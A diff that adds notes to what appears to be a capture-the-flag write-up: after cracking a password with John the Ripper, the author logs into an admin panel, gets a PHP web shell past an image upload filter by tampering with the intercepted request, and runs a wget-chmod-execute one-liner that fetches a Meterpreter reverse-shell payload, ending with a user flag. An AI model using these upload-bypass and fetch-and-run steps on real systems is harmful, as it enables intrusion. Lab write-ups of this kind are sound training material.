@@ -99,4 +99,35 @@ Almost done: Processing the remaining buffered candidate passwords, if any.
 Proceeding with wordlist:/usr/share/john/password.lst
 whatever1        (?)     
 
+entered the admin dashboard using this credentials
+
+in the profile settings we got picture upload
+
+in one of attempts uploading payload i manage to discover that there is a /uploads/images/ directory
+
+used a simple shell php script:
+https://raw.githubusercontent.com/artyuum/simple-php-web-shell/master/index.php
+
+we need to select intercept on and try to upload any images
+
+in intercepted request we need to change filename to php file and change the content of body after PNG string 
+
+do intercept response
+
+it should upload the php file
+
+launching the meterpreter listener
+
+entering the webshell.php
+
+next we need to upload meterpreter shell to machine using:
+
+wget http://ip:80/rv45 rv45; chmod +x rv45; ./rv45
+
+and we get the reverse shell and get the userflag:
+6f8aeb5c85f85443eeae48a4bfdf49b4
+
+
+
+
 
